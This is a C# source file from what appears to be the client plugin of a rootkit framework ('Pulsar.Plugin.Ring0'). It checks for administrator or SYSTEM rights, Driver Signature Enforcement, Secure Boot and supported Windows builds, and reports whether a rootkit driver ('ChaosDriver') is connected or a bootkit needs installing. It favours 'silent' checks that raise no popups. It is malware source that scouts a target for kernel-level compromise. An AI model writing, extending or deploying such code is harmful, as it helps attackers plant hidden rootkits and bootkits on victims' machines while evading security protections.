using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
using Microsoft.Win32;
using Pulsar.Plugin.Ring0.Common;

namespace Pulsar.Plugin.Ring0.Client
{
    /// <summary>
    /// System security checks for DSE, Secure Boot, and admin status
    /// </summary>
    public static class SystemChecks
    {
        #region Native Imports

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool GetFirmwareEnvironmentVariableW(
            string lpName,
            string lpGuid,
            IntPtr pBuffer,
            uint nSize);

        [DllImport("ntdll.dll")]
        private static extern int NtQuerySystemInformation(
            int SystemInformationClass,
            IntPtr SystemInformation,
            uint SystemInformationLength,
            out uint ReturnLength);

        private const int SystemCodeIntegrityInformation = 103;
        private const int SystemSecureBootInformation = 145;

        [StructLayout(LayoutKind.Sequential)]
        private struct SYSTEM_CODEINTEGRITY_INFORMATION
        {
            public uint Length;
            public uint CodeIntegrityOptions;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct SYSTEM_SECUREBOOT_INFORMATION
        {
            public byte SecureBootEnabled;
            public byte SecureBootCapable;
        }

        // Code Integrity flags
        private const uint CODEINTEGRITY_OPTION_ENABLED = 0x01;
        private const uint CODEINTEGRITY_OPTION_TESTSIGN = 0x02;
        private const uint CODEINTEGRITY_OPTION_UMCI_ENABLED = 0x04;
        private const uint CODEINTEGRITY_OPTION_UMCI_AUDITMODE_ENABLED = 0x08;
        private const uint CODEINTEGRITY_OPTION_UMCI_EXCLUSIONPATHS_ENABLED = 0x10;
        private const uint CODEINTEGRITY_OPTION_TEST_BUILD = 0x20;
        private const uint CODEINTEGRITY_OPTION_PREPRODUCTION_BUILD = 0x40;
        private const uint CODEINTEGRITY_OPTION_DEBUGMODE_ENABLED = 0x80;
        private const uint CODEINTEGRITY_OPTION_FLIGHT_BUILD = 0x100;
        private const uint CODEINTEGRITY_OPTION_FLIGHTING_ENABLED = 0x200;
        private const uint CODEINTEGRITY_OPTION_HVCI_KMCI_ENABLED = 0x400;
        private const uint CODEINTEGRITY_OPTION_HVCI_KMCI_AUDITMODE_ENABLED = 0x800;
        private const uint CODEINTEGRITY_OPTION_HVCI_KMCI_STRICTMODE_ENABLED = 0x1000;
        private const uint CODEINTEGRITY_OPTION_HVCI_IUM_ENABLED = 0x2000;

        #endregion

        /// <summary>
        /// Check if running as administrator
        /// </summary>
        public static bool IsAdmin()
        {
            try
            {
                using (var identity = WindowsIdentity.GetCurrent())
                {
                    var principal = new WindowsPrincipal(identity);
                    return principal.IsInRole(WindowsBuiltInRole.Administrator);
                }
            }
            catch
            {
                return false;
            }
        }

        /// <summary>
        /// Check if running as SYSTEM
        /// </summary>
        public static bool IsSystem()
        {
            try
            {
                using (var identity = WindowsIdentity.GetCurrent())
                {
                    return identity.IsSystem;
                }
            }
            catch
            {
                return false;
            }
        }

        /// <summary>
        /// Check Driver Signature Enforcement status
        /// </summary>
        public static DseStatus CheckDSE()
        {
            var result = new DseStatus();

            try
            {
                // Method 1: NtQuerySystemInformation
                var info = new SYSTEM_CODEINTEGRITY_INFORMATION { Length = (uint)Marshal.SizeOf<SYSTEM_CODEINTEGRITY_INFORMATION>() };
                IntPtr buffer = Marshal.AllocHGlobal(Marshal.SizeOf<SYSTEM_CODEINTEGRITY_INFORMATION>());

                try
                {
                    Marshal.StructureToPtr(info, buffer, false);
                    int status = NtQuerySystemInformation(SystemCodeIntegrityInformation, buffer, info.Length, out _);

                    if (status == 0)
                    {
                        info = Marshal.PtrToStructure<SYSTEM_CODEINTEGRITY_INFORMATION>(buffer);
                        result.CodeIntegrityOptions = info.CodeIntegrityOptions;
                        result.DseEnabled = (info.CodeIntegrityOptions & CODEINTEGRITY_OPTION_ENABLED) != 0;
                        result.TestSigningEnabled = (info.CodeIntegrityOptions & CODEINTEGRITY_OPTION_TESTSIGN) != 0;
                        result.DebugModeEnabled = (info.CodeIntegrityOptions & CODEINTEGRITY_OPTION_DEBUGMODE_ENABLED) != 0;
                        result.HvciEnabled = (info.CodeIntegrityOptions & CODEINTEGRITY_OPTION_HVCI_KMCI_ENABLED) != 0;
                    }
                }
                finally
                {
                    Marshal.FreeHGlobal(buffer);
                }

                // Method 2: Registry check for test signing
                using (var key = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\CI"))
                {
                    if (key != null)
                    {
                        var policyValue = key.GetValue("UMCIAuditMode");
                        // Additional CI policy checks can be added here
                    }
                }

                // Check BCD for testsigning
                try
                {
                    var psi = new ProcessStartInfo
                    {
                        FileName = "bcdedit.exe",
                        Arguments = "/enum {current}",
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        CreateNoWindow = true
                    };

                    using (var proc = Process.Start(psi))
                    {
                        string output = proc.StandardOutput.ReadToEnd();
                        proc.WaitForExit();

                        result.TestSigningEnabled |= output.Contains("testsigning") && output.Contains("Yes");
                    }
                }
                catch { }

                result.Success = true;
            }
            catch (Exception ex)
            {
                result.Success = false;
                result.ErrorMessage = ex.Message;
            }

            return result;
        }

        /// <summary>
        /// Check Secure Boot status - uses silent methods only, no drive mounting
        /// </summary>
        public static SecureBootStatus CheckSecureBoot()
        {
            var result = new SecureBootStatus();

            try
            {
                // Method 1: NtQuerySystemInformation - silent, no UI
                IntPtr buffer = Marshal.AllocHGlobal(Marshal.SizeOf<SYSTEM_SECUREBOOT_INFORMATION>());

                try
                {
                    int status = NtQuerySystemInformation(
                        SystemSecureBootInformation,
                        buffer,
                        (uint)Marshal.SizeOf<SYSTEM_SECUREBOOT_INFORMATION>(),
                        out _);

                    if (status == 0)
                    {
                        var info = Marshal.PtrToStructure<SYSTEM_SECUREBOOT_INFORMATION>(buffer);
                        result.SecureBootEnabled = info.SecureBootEnabled != 0;
                        result.SecureBootCapable = info.SecureBootCapable != 0;
                        result.Success = true;
                        return result; // Got it, no need for other methods
                    }
                }
                finally
                {
                    Marshal.FreeHGlobal(buffer);
                }

                // Method 2: Registry check - silent, no UI
                try
                {
                    using (var key = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\SecureBoot\State"))
                    {
                        if (key != null)
                        {
                            var value = key.GetValue("UEFISecureBootEnabled");
                            if (value != null)
                            {
                                result.SecureBootEnabled = Convert.ToInt32(value) == 1;
                                result.SecureBootCapable = true;
                            }
                        }
                    }
                }
                catch { }

                // NOTE: Do NOT use GetFirmwareEnvironmentVariableW - can trigger popups on some systems

                result.Success = true;
            }
            catch (Exception ex)
            {
                result.Success = false;
                result.ErrorMessage = ex.Message;
            }

            return result;
        }

        /// <summary>
        /// Get comprehensive rootkit status
        /// </summary>
        public static RootkitStatus GetFullStatus(ChaosDriver driver)
        {
            var status = new RootkitStatus
            {
                Timestamp = DateTime.UtcNow
            };

            try
            {
                // Check Windows build compatibility
                status.WindowsBuild = GetWindowsBuild();
                status.BuildSupported = IsBuildSupported(status.WindowsBuild);

                // Check DSE
                var dse = CheckDSE();
                status.DseEnabled = dse.DseEnabled && !dse.TestSigningEnabled;

                // Check Secure Boot
                var sb = CheckSecureBoot();
                status.SecureBootEnabled = sb.SecureBootEnabled;

                // Check driver status - try to connect if not already connected
                status.DriverLoaded = driver.IsDriverRunning();
                
                // Also check device accessibility directly for accurate status
                var diag = driver.GetDiagnostics();
                
                // Try to connect if device is accessible but not connected
                if ((status.DriverLoaded || diag.DeviceAccessible) && !driver.IsConnected)
                {
                    driver.Connect();
                }
                
                // Report connected if driver connected OR device is accessible
                status.DriverConnected = driver.IsConnected || diag.DeviceAccessible;
                
                // Also update DriverLoaded if device is accessible (driver must be loaded)
                if (diag.DeviceAccessible)
                {
                    status.DriverLoaded = true;
                }

                // Check if bootkit is installed
                status.BootkitInstalled = BootkitInstaller.IsBootkitInstalled();

                // Build status message
                if (status.DriverConnected)
                {
                    status.StatusCode = Ring0Commands.STATUS_DRIVER_LOADED;
                    status.Message = "Rootkit driver connected and operational";
                }
                else if (status.DriverLoaded)
                {
                    status.StatusCode = Ring0Commands.STATUS_DRIVER_LOADED;
                    status.Message = "Driver loaded but not connected";
                }
                else if (status.BootkitInstalled)
                {
                    status.StatusCode = Ring0Commands.STATUS_DRIVER_NOT_LOADED;
                    status.Message = "Bootkit installed - reboot required to load driver";
                }
                else if (status.DseEnabled)
                {
                    status.StatusCode = Ring0Commands.STATUS_DSE_ENABLED;
                    status.Message = "DSE enabled - bootkit installation required";
                }
                else
                {
                    status.StatusCode = Ring0Commands.STATUS_DSE_DISABLED;
                    status.Message = "DSE disabled (test signing) - driver can be loaded directly";
                }
            }
            catch (Exception ex)
            {
                status.StatusCode = Ring0Commands.STATUS_ERROR;
                status.Message = $"Error: {ex.Message}";
            }

            return status;
        }

        /// <summary>
        /// Supported Windows builds for offset-dependent operations
        /// These must match the driver's InitializeOffsets function in utils.c
        /// </summary>
        private static readonly int[] SupportedBuilds = new[]
        {
            // Windows 10 20H1-22H2
            19041, 19042, 19043, 19044, 19045,
            // Windows 10 1809-1903
            18362, 17763,
            // Windows 10 older
            17134, 16299,
            // Windows 11 21H2-23H2
            22000, 22621, 22631,
            // Windows 11 24H2
            26100
        };

        /// <summary>
        /// Get the current Windows build number
        /// </summary>
        public static int GetWindowsBuild()
        {
            try
            {
                // Most reliable method: Registry
                using (var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion"))
                {
                    if (key != null)
                    {
                        // Try CurrentBuildNumber first (more reliable)
                        var buildStr = key.GetValue("CurrentBuildNumber") as string;
                        if (!string.IsNullOrEmpty(buildStr) && int.TryParse(buildStr, out int build))
                        {
                            return build;
                        }

                        // Fallback to CurrentBuild
                        buildStr = key.GetValue("CurrentBuild") as string;
                        if (!string.IsNullOrEmpty(buildStr) && int.TryParse(buildStr, out build))
                        {
                            return build;
                        }
                    }
                }

                // Fallback to Environment.OSVersion (less reliable for newer Windows)
                return Environment.OSVersion.Version.Build;
            }
            catch
            {
                return 0;
            }
        }

        /// <summary>
        /// Check if the current Windows build supports offset-dependent operations
        /// </summary>
        public static bool IsBuildSupported()
        {
            int currentBuild = GetWindowsBuild();
            return IsBuildSupported(currentBuild);
        }

        /// <summary>
        /// Check if a specific Windows build supports offset-dependent operations
        /// </summary>
        public static bool IsBuildSupported(int buildNumber)
        {
            foreach (var supported in SupportedBuilds)
            {
                if (buildNumber == supported)
                    return true;
            }
            return false;
        }

        /// <summary>
        /// Get build support info for diagnostics
        /// </summary>
        public static (int Build, bool Supported, string Message) GetBuildSupportInfo()
        {
            int build = GetWindowsBuild();
            bool supported = IsBuildSupported(build);
            
            string message;
            if (supported)
            {
                message = $"Windows build {build} is supported";
            }
            else
            {
                message = $"Windows build {build} is NOT supported. Supported: 19041-19045, 18362, 17763, 17134, 16299, 22000, 22621, 22631, 26100";
            }
            
            return (build, supported, message);
        }
    }

    public class DseStatus
    {
        public bool Success { get; set; }
        public bool DseEnabled { get; set; }
        public bool TestSigningEnabled { get; set; }
        public bool DebugModeEnabled { get; set; }
        public bool HvciEnabled { get; set; }
        public uint CodeIntegrityOptions { get; set; }
        public string ErrorMessage { get; set; }
    }

    public class SecureBootStatus
    {
        public bool Success { get; set; }
        public bool SecureBootEnabled { get; set; }
        public bool SecureBootCapable { get; set; }
        public string ErrorMessage { get; set; }
    }
}
